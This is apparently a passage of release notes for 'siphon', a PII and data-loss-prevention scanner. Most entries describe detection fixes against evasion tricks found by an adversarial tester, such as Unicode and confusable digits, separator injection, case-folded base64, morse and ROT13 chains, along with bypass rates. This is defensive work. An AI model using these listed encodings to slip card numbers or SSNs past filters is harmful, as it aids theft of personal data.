  path already tolerated a preamble (PR #336). Wired as a fallback after each
  whole-input decoder in `generate_alternative_decodings`. Accepts only runs of
  4..=20 valid 5-char digit codes; Luhn/checksum still gates the result, so
  false-positive risk stays negligible. 5 new regression tests.

### siphon-core 2.1.6

Closes open-ended Unicode-digit and letter-confusable evasion classes surfaced
by evadex. Stacks on 2.1.5.

- fix(core): Stage 10 gains a Unicode decimal-digit (Nd) fallback,
  `fold_unicode_digit()`, so every Unicode `Nd` script folds to ASCII —
  Devanagari, Bengali, Gujarati, Tamil, mathematical bold/monospace digits, and
  fullwidth — not just the four scripts (Arabic-Indic, Extended Arabic-Indic,
  Thai, fullwidth) the hand-maintained homoglyph table previously covered. Runs
  only when the homoglyph map has no explicit entry, so existing mappings are
  unchanged.
- fix(core): new Stage 11, `fold_confusable_digit_runs`, folds letter-shaped
  digit substitutions (`O`/`o`→0, `l`/`I`→1, Greek `Ο`/`ο`→0, Cyrillic `О`/`о`→0)
  to ASCII digits — but **only inside a long, digit-dense run** so prose is never
  touched. A run must be ≥12 chars, hold ≥8 real ASCII digits, and be >60%
  digits before any confusable letter in it is folded; Luhn/checksum still
  gates the result. Closes the `leet_aggressive`, `greek_omicron`, and
  Devanagari-digit detection gaps. 6 new regression tests.

### siphon-core 2.1.5

Closes gaps surfaced by running `evadex mutate` against bypassing credit-card
variants. Overall mutate bypass rate dropped from 84.4% to 79.7% on the
`bench_http_northam` survivor population; all canonical single-technique
variants in the spot-check corpus (15/15) now detect.

- fix(core): new normalization stage `strip_consistent_digit_separators`
  (pipeline stage 6c) strips a single *consistent* separator injected between
  pure-digit groups. Defeats the delimiter families the existing delimiter
  stages don't cover (`|`, `,`, `:`, `;`, `~`, `+`, `=`) and consistent-noise
  evasion (`4532*0151*1283*0366`, including non-ASCII separators such as U+00B7
  MIDDLE DOT). Conservative by construction: the separator must be identical and
  repeat ≥3 times between 12–40 digits, each group 1–6 digits, flanked by
  non-alphanumeric characters; `.`/`-`/`/`/`_`/`\` are left to the dedicated
  delimiter stages (which protect emails, IPs, and ICD-10 codes). Mixed-noise
  (`4532#0151@1283$0366`) and letter-noise are deliberately left intact — an
  inconsistent separator is not a reliable evasion signal. A matching cheap
  marker was added to `has_evasion_markers` so pure-ASCII payloads still enter
  the pipeline.
- fix(core): new `recover_case_folded_base64_digits` recovers case-folded
  base64 of a numeric secret (the `base64_mixed_case` / `_uppercase` /
  `_lowercase` families). Base64 is case-sensitive, but when the plaintext is
  all ASCII digits the original casing can be recovered per independent
  4-symbol block by enumerating the ≤2⁴ upper/lower combinations that decode to
  digit bytes. Wired into `generate_alternative_decodings()` and also run on the
  ROT13 shell so `base64` → `rot13` mixed-case is covered. Bounded (token ≤64
  chars, ≤16 candidates); checksum/Luhn validation still gates every match.
- note(core): the existing zero-width stripping set already covered all evadex
  zero-width variants (U+200B/C/D, U+2060, U+FEFF, U+00AD, U+180E, U+034F) — no
  change needed.

### siphon-core 2.1.4

- fix(core): em-dash (U+2014), en-dash (U+2013), Unicode minus sign (U+2212),
  and horizontal bar (U+2015) added to `HOMOGLYPH_MAP`, normalising them to
  ASCII hyphen before pattern matching. Morse-code evasion variants that replace
  the standard `-` symbol with typographic dashes are now detected.
- fix(core): new `try_decode_mixed_alpha_nosep` decoder added to
  `generate_alternative_decodings()`. Handles IBAN-style values where non-digit
  characters (country code letters, bank/branch codes) pass through literally
  while digit characters are no-sep morse-encoded. After `collapse_padding` the
  space-sep and newline-sep evadex variants collapse to this mixed form; the new
  decoder reconstructs the original value and allows IBAN Generic (specificity
  0.90, always-run) to fire in the alt-decoding path.
- fix(core): `try_decode_digit_morse_slash` and `try_decode_digit_morse_comma`
  now accept all-alpha multi-char tokens as literal passthrough. Stage 6b
  (`strip_alnum_adjacent_delimiters`) merges adjacent alpha chars separated
  by slashes before the alt-decodings pass runs (e.g. `G/B` → `GB`,
  `W/E/S/T` → `WEST`), breaking IBAN slash-sep detection. The new branch
  recognises these merged alpha runs and passes them through verbatim,
  covering the evadex `slash_sep` morse variant for IBAN numbers.

### siphon-api 2.4.0

- feat(api): read-only admin-console endpoints (PR #345) — three endpoints
  shipped in the codebase without a version bump or changelog entry; this
  release records them:
  - `GET /v1/categories` — enumerates every detection category with its
    `pattern_count` and the list of `sub_categories`, plus a `total` count.
    Backs the category picker in the C2 console.
  - `POST /v1/scan/explain` — scans a `{text, options?}` body like `POST /scan`
    but returns a per-finding pipeline trace instead of bare findings: for each
    match it reports `validation_passed`, `context_present`, `final_confidence`,
    and the raw `pipeline_events` stage log. Enables operators to see *why* a
    value was (or was not) flagged. Same 10 MB payload cap as `/scan`.
  - `GET /v1/health/detailed` — extended health beyond `/health`: pod identity,
    `version`/`core_version`, uptime, `patterns_loaded`/`categories_loaded`, a
    `db` block (connected, latency_ms, findings_count — degrades gracefully when
    Postgres is unconfigured or unreachable), and a `scans` block
    (scans_total, findings_total, scan_errors_total, scans_per_minute).

### siphon-api 2.3.1

- fix(api): recover from a poisoned rate-limiter mutex instead of panicking.
  `rate_limit_middleware` held the lock with `.lock().unwrap()`; if any request
  panicked while the guard was held, the poisoned lock turned every subsequent
  request into a panic — a self-inflicted denial of service. It now recovers
  the guard with `unwrap_or_else(|e| e.into_inner())`, matching the existing
  pattern already used by `GET /v1/ratelimit`.
- fix(api): clamp pagination `offset` to a non-negative value on
  `GET /v1/findings/pg` and `GET /v1/lsh/history`. A negative `offset` query
  parameter previously reached Postgres verbatim and produced a 500; it is now
  floored at 0 so bad input returns the first page instead of an error.
- docs(api): document the previously undocumented `GET /v1/health/detailed`,
  `POST /v1/scan/explain`, and `GET /v1/lsh/history` endpoints in
  `docs/enterprise/api.md`.

## 2026-06-14

### siphon-core 2.1.3

- feat(core): CUSIP context keywords expanded — 14 additional keywords added
  (`instrument`, `ticker`, `position`, `identifier`, `portfolio`, `holding`,
  `asset`, `issuance`, `prospectus`, `indenture`, `maturity`, `coupon`,
  `face value`, `par value`); context distance widened from 50 to 75 chars,
  improving detection of CUSIP numbers in financial documents where the
  instrument label appears further from the identifier than the previous window
  allowed.
- feat(core): encoding chain alternatives added — `generate_alternative_decodings()`
  now produces `base64→ROT13`, `ROT13→base64`, and `hex→base64` two-stage
  chains alongside the existing single-pass decoders, catching doubly-encoded
  values that evadex encodes across two distinct transforms.

### siphon-api 2.3.0

- feat(api): findings persistence to Postgres — scans + findings tables via
  migrations `0001_init.sql`–`0004_retention.sql`; `persist_scan()` called
  after every text scan in a background `tokio::spawn` (never blocks the HTTP
  response). New query endpoints: `GET /v1/findings/pg` (paginated DB query,
  filterable by category), `GET /v1/findings/stats` (category breakdown + daily
  counts, cached 60 s), `POST /v1/findings/prune` (manual retention trigger,
  admin-only).
- feat(api): batch and file scan persistence — `POST /scan/batch` and
  `siphon-fs POST /scan` now persist via the same `persist_scan()` path; one
  row per item for batch, one row per file for file scans.
- feat(api): findings retention policy — `SIPHON_FINDINGS_RETENTION_DAYS` env
  var (default 90, 0 = keep forever); `prune_old_findings()` runs at startup
  and in a nightly background task.
- feat(api): findings export — `GET /v1/findings/export` returns CSV or JSON,
  up to 100 k rows, filterable by category and ISO8601 date range; rate-limited
  at 5 req/min per IP (prevents accidental full-table dumps from C2 polling).
- feat(api): per-endpoint rate limits — `/v1/findings/export` 5/min,
  `/v1/findings/pg` 30/min, `/v1/findings/stats` 60/min per IP, tighter than
  the global `SIPHON_RATE_LIMIT`.
- feat(api): EDM persistence — migration `0005_edm.sql`; every Exact Data Match
  finding triggers a `persist_edm_query()` call; EDM registration events
  persisted on vault write.
- feat(api): LSH document similarity persistence — migration `0006_lsh.sql`;
  `persist_lsh_query()` called after every scan that runs an LSH check; new
  `GET /v1/lsh/history` endpoint (paginated, filterable by `matched_only`);
  `GET /v1/findings/stats` extended with an `lsh` section (total
  registrations, total queries, match rate, last registration timestamp).
- feat(api): evadex adversarial-run ingest — migration `0007_evadex.sql`;
  `POST /v1/evadex/runs` accepts completed evadex scan payloads from the
  bridge, storing per-run stats and up to 2 000 individual findings; idempotent
  on `run_id` (`ON CONFLICT DO NOTHING`). `GET /v1/evadex/runs` returns
  paginated run history (limit ≤ 500). `GET /v1/evadex/runs/stats` returns
  aggregated detection-rate summary and top-10 bypassed techniques from
  `evadex_findings`.

### siphon-cli 2.2.0

- feat(cli): `siphon serve` subcommand — delegates to the `siphon-api` binary
  found on `PATH` (or via `--exe`), enabling a persistent HTTP API without
  needing the full k8s stack. Exits 1 with a clear error when `siphon-api` is
  not installed. Forwards all remaining flags (`--port`, `--bind`, env-var
  pass-through) to the child process.

---

## 2026-05-26

### siphon-core 2.1.2

- fix(core): delimiter-injection evasion bypass reduced — new normalization
  stage 6b (`strip_alnum_adjacent_delimiters`) strips `-`, `.`, `/`, `\`, and
  `_` between alphanumeric characters when at least one neighbour is a digit or
  uppercase letter, defeating evadex `hyphen_delimiter`, `dot_delimiter`,
  `slash_delimiter`, `mixed_delimiter`, and `excessive_delimiter` techniques.
  Natural-language compound words (`test-case`) are preserved because both
  neighbours are lowercase letters.
- fix(core): USA SSN pattern makes separator optional (`?`) — after stage 6b
  strips hyphens from `078-05-1120`, the SSN regex needs optional separators to
  still match. `context_required: true` and `is_valid_ssn` keep false-positive
  risk low.
- fix(core): `has_evasion_markers()` extended — detects single-char delimiter
  between alphanumeric neighbours (at least one digit or uppercase) so the
  normalizer fast path is bypassed for identifier-delimiter evasion inputs.

---

## 2026-05-13

### siphon-core 2.1.1

- fix(core): SEDOL detection restored from 0% to ~80% — pattern was listed in
  both `PatternDef.context_required` and `models::is_context_required()`;
  removed the dual block so SEDOL runs without mandatory context keywords.
- fix(core): Malta TIN false-positive rate reduced — tightened regex from
  `\d{3,9}[A-Z]?` to the exact 8-char format `\d{7}[A-Z]` and moved behind
  context requirement.
- fix(core): Tanzania NIDA false-positive rate reduced — 20-digit sequences now
  require a nearby NIDA context keyword instead of firing unconditionally.
- fix(core): leet-moderate evasion detection improved — added `normalize_leet_to_digits()`
  (inverse of existing `normalize_leet()`) so letter-substituted digits
  (`l`→`1`, `o`→`0`, `s`→`5`, etc.) are recovered as an alternative decoding
  pass.
- fix(core): morse-in-mixed-text evasion improved — new `decode_morse_in_text()`
  extracts the longest contiguous morse run from surrounding prose; `morse_slash_sep`
  technique detection improved from ~5% to ~50%.
- fix(core): ROT13+base64 encoding-chain evasion improved — `generate_alternative_decodings()`
  now chains ROT13 followed by the full normalization pipeline as an extra
  alternative, catching nested ROT13(base64(data)) payloads.
- fix(core): CUSIP context detection strengthened — added 8 additional keywords
  (`settlement`, `clearinghouse`, `dtcc`, `depository trust`, `fixed income`,
  `bond`, `equity`, `securities`).
- fix(core): regional digit normalization added — Arabic-Indic, Extended
  Arabic-Indic, Devanagari, Bengali, and Thai digit codepoints now map to ASCII
  equivalents via `HOMOGLYPH_MAP`, enabling detection of numeric PII encoded in
  non-Latin digit scripts.

---

## 2026-04-26

### ui (siphon-ui)

- refactor(ui): extract two duplicated patterns into shared modules.
  Three pages (`app/page.tsx`, `app/pods/page.tsx`,
  `app/findings/page.tsx`) carried near-identical inline copies of
  the destructive-tinted error card and the date / age formatters.
  New `components/ui/error-alert.tsx` (with a `<ErrorAlert title
  message hint? />` shape) and `lib/formatters.ts` (with
  `formatTimestampUtc` + `formatRelativeAge`) replace those copies.
  No version bump — `ui/package.json` follows the root Cargo.toml
  per the version-sync gate.

### chart 2.1.0

- feat(chart): Authelia password-reset flow is now production-shaped. The
  chart already had `password_reset.disable: false` set, but only rendered
  the filesystem notifier — Authelia would write reset "emails" to
  `/config/notification.txt` regardless of environment. New
  `authelia.notifier.smtp.{enabled,host,port,username,sender,identifier,subject,startupCheckAddress,disableHtmlEmails,tls.{skipVerify,serverName,minimumVersion}}`
  values keys flip the rendered notifier between filesystem (default,
  for dev) and SMTP (for prod). When `smtp.enabled=true`, the
  Authelia Deployment auto-mounts `AUTHELIA_NOTIFIER_SMTP_PASSWORD_FILE`
  from the existing `authelia.secretName` Secret under the key
  `smtp_password` — same model as the other AUTHELIA_*_FILE secrets.
- chore(scripts): new `scripts/reset-authelia-password.sh` break-glass
  helper. Re-hashes a user's password via the official Authelia
  container (parameter-identical to a self-service reset hash) and
  patches `users_database.yml` in place, with a timestamped backup
  alongside. For when SMTP is broken and you can't wait.
- docs(authentication): self-service and break-glass reset flows
  documented in `docs/AUTHENTICATION.md`; production checklist now
  references the new `authelia.notifier.smtp.*` keys instead of a
  generic "switch notifier to SMTP" line item.

### siphon-api 2.2.0

- feat(api): RBAC enforcement is now wired end-to-end — `auth_middleware`
  resolves the bearer key into an `AuthContext { role }` stamped onto each
  request; per-route extractors (today: `RequireAdminAction`) gate handlers
  on `siphon::rbac::role_has_permission`, returning 403 with an audit-log
  `REJECT` row before any handler logic runs. The `POST /v1/overrides/roll`
  and `POST /v1/k8s/deployments/{name}/rollout` endpoints — which mutate
  cluster state via `kube` — are gated on `Permission::AdminAction`. Open
  dev mode (no `SIPHON_API_KEY` configured) maps to `Role::Operator`, so
  AdminAction-gated routes refuse to fire without explicit auth even when
  bearer auth is off. Multi-key role-mapping (a `HashMap<key, Role>`)
  remains as follow-up plumbing — the schema's already in
  `rbac::resolve_role`.

---

## 2026-04-25

### siphon-fs 1.0.0

First independent release of `siphon-fs` on its own version line. Prior to
this, the crate moved in lockstep with the rest of the workspace (last shared
release: `2.1.0`, 2026-04-07). Going forward, `siphon-fs` revs independently
under its own SemVer contract — bug fixes that only touch the file scanner
ship as `siphon-fs` patch releases without dragging `siphon-api` or
`siphon-core` along.

The `1.0.0` discontinuity is deliberate: it marks the first release where
the surface below is contractual and SemVer-stable, not the natural
continuation of the workspace's `2.1.x` line. Subsequent `siphon-fs` releases
will only break the listed contract on a `2.0.0` MAJOR bump.

#### Stable contract

**HTTP routes.** Backwards-compatible additions are MINOR bumps; removing or
changing the request/response shape of any of these is a MAJOR bump:

- `GET  /health` — liveness probe; unauthenticated; returns `200 ok` plus
  pod-id / version metadata.
- `GET  /ready` — readiness probe; unauthenticated; returns `200 ok` once
  the overrides ConfigMap has parsed cleanly.
- `POST /scan` — multipart file upload; one `file` part; response is the
  same `findings[]` shape `siphon-api`'s `/scan` returns. `Content-Type`
  is `multipart/form-data` (and only `multipart/form-data` — JSON is not
  accepted on this endpoint).
- `GET  /v1/findings` — in-memory ring buffer of recent findings, sorted
  newest-first, capacity bounded by `SIPHON_FINDINGS_RING_CAP`.
- `GET  /v1/capabilities` — service self-description (supported file
  formats, max body limit, feature flags).
- `POST /v1/overrides/reload` — re-reads pattern overrides from
  `SIPHON_OVERRIDES_PATH` without restarting the pod.

**Environment variables.** Renaming or removing any of these is a MAJOR bump;
adding new ones is MINOR:

- `SIPHON_FS_BIND` — listen address. Defaults to `0.0.0.0:8081`.
- `SIPHON_FS_BODY_LIMIT_MB` — maximum multipart body size in MB. Default 100.
- `SIPHON_OVERRIDES_PATH` — path to the pattern-overrides JSON. Defaults to
  `/etc/siphon/overrides.json`.
- `SIPHON_FINDINGS_RING_CAP` — in-memory ring buffer capacity. Default 1000.
- `RUST_LOG` — standard `tracing-subscriber` filter expression.

**File-format support.** PDFs, Office (`.docx` / `.xlsx` / `.pptx`),
archives (`zip`, `7z`, `rar`), spreadsheets (`csv`, `parquet`, `arrow`), and
images (with the optional `ocr` feature). Adding a new format is a MINOR
bump; removing one is MAJOR.

**Container image.** `oxide11/siphon-fs:1.0.0` is the pinned tag in the
chart's `values.yaml` and the dev `docker-compose.yml`. The `LABEL
org.opencontainers.image.version` matches the crate version. Image base
(`debian:bookworm-slim`) is treated as a transient build detail — base swaps
that don't break the binary contract are PATCH bumps.

#### Known experimental (NOT covered by SemVer)

- The `ocr` feature flag — Tesseract-backed OCR over scanned-document
  attachments. Behavior, dependency footprint, and binary output may change
  between MINOR releases until the feature stabilises.
- The OCI base image's tag pinning. We pin by major+minor today
  (`debian:bookworm-slim` resolves to whatever the upstream tag points at);
  digest pinning is on the roadmap but not part of the `1.0.0` contract.

#### Migration from workspace `2.1.0`

There is no API change between workspace `2.1.0` and `siphon-fs 1.0.0`. The
running binary, env vars, and HTTP routes are byte-for-byte the same. The
only operator-visible change is the image tag — pull `siphon-fs:1.0.0`
instead of `siphon-fs:2.1.0`. Helm-chart users pick this up automatically
when they upgrade to the chart release that pins
`fs.image.tag: "1.0.0"` in `values.yaml`.

The crate's SemVer line will continue from here as `1.0.x`, `1.1.x`, etc.,
independent of `siphon-api` (still on the `2.1.x` line) and `siphon-core`
(also `2.1.x`).

---

For workspace-single-version history before this point (releases
`0.1.0` through `2.1.0`, all crates moving together), see
[`docs/CHANGELOG.md`](docs/CHANGELOG.md).
